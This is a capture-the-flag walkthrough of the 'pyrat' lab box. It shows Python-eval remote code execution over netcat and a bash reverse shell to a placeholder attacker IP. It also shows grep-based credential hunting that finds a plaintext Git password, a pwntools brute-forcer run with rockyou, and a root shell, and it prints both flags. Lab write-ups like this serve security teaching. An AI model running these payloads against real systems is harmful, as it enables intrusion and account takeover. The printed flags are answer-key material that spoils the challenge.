I started with basic enumeration. Nmap showed SSH and an HTTP-alt service on 8000.

```
nmap -p- -sC -sV -oN nmap_initial pyrat.thm

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 64
8000/tcp open  http-alt syn-ack ttl 64
```

Browsing to port 8000 returned: “Try a more basic connection!” That hinted at a raw TCP service. I used netcat and confirmed the server was evaluating Python by sending `print(1+1)` and getting `2`. That gave me RCE.

Listener:

```
nc -lvnp 4444
```

Connect and pop a shell:

```
nc pyrat.thm 8000
__import__('os').system("bash -c 'bash -i >& /dev/tcp/<MY_IP>/4444 0>&1'")
```

I landed as `www-data` with limited access. I enumerated typical dev paths and found a local Git repo.

```
ls -al /opt
cd /opt/dev
ls -al
find /opt -maxdepth 3 -type d -name ".git" 2>/dev/null
```

Credential hunting paid off immediately:

```
grep -RniE 'pass|user|cred|token' /opt /var/www 2>/dev/null | head -50
```

Relevant hits:

```
/opt/dev/.git/config:14:     username = think
/opt/dev/.git/config:15:     password = _TH1NKINGPirate$_
```

I used those to log in as the `think` user and grabbed the user flag.

> 996bdb1f619a68361417cabca5454705

Privilege escalation came from the same repo. Running Git inside `.git` failed because it’s not a work tree:

```
think@box:/opt/dev/.git$ git status
fatal: this operation must be run in a work tree
```

So I worked from the project root:

```
cd /opt/dev
git status
```

Output showed a deleted file:

```
deleted:    pyrat.py.old
```

I restored it and inspected the code:

```
git restore pyrat.py.old
cat pyrat.py.old
```

The server is a Python socket listener that switches on received strings. Two key observations:

1. There’s an `admin` flow that checks a password. If validated, it avoids the privilege drop and allows `shell` to execute as root.
2. Otherwise, it downgrades privileges and runs `exec_python(...)` on user input (the behavior I used for initial RCE).

I wrote a simple pwntools brute-forcer to try passwords against the `admin` path. The flow is: connect → send `admin` → wait for `Password:` → try candidates until success.

```
from pwn import *

host = "pyrat.thm"
port = 8000
password_file = "/usr/share/wordlists/rockyou.txt"

def connect_to_service():
    return remote(host, port)

def attempt_password(password):
    conn = connect_to_service()
    conn.sendline(b"admin")
    conn.recvuntil(b"Password:")
    conn.sendline(password.encode())
    r1 = conn.recvline(timeout=2) or b""
    r2 = conn.recvline(timeout=2) or b""
    resp = r1 + r2
    ok = b"Welcome" in resp or b"Success" in resp
    conn.close()
    return ok

def fuzz_passwords():
    with open(password_file, "r", encoding="latin-1") as f:
        for pw in f:
            pw = pw.strip()
            if attempt_password(pw):
                print(f"[+] Found working password: {pw}")
                break

if __name__ == "__main__":
    fuzz_passwords()
```

The script identified:

```
[+] Found working password: abc123
```

With the admin password, I used netcat directly, authenticated, and asked for a shell. Because the admin path doesn’t drop privileges, I was dropped into a root shell.

```
nc pyrat.thm 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
pyrat.py  root.txt  snap
# cat root.txt
```

> ba5ed03e9e74bb98054438480165e221
